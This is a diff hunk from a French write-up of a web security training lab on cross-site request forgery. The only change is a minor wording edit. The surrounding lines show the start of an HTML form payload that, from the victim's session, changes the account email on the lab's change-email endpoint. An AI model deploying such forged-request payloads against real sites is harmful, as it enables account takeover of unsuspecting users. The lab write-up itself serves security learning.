@@ -16,7 +16,7 @@ You cannot register an email address that is already taken by another user. If y
 ## Solution
 
 Nous cherchons à créer un payload réalisant, depuis la session victime, un changement de mail de notre choix.
-En utilisant le cours, nous pouvons assez aisément construire le payload suivant, que nous allons mettre dans le Body de notre espace dans le lab avant de "Deliver exploit to victim".
+En utilisant le cours, nous pouvons assez aisément construire le payload suivant, que nous allons mettre dans le Body de notre espace du lab avant de "Deliver exploit to victim".
 ```
 <form method="POST" action="https://<lab_id>.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="t@t.com">
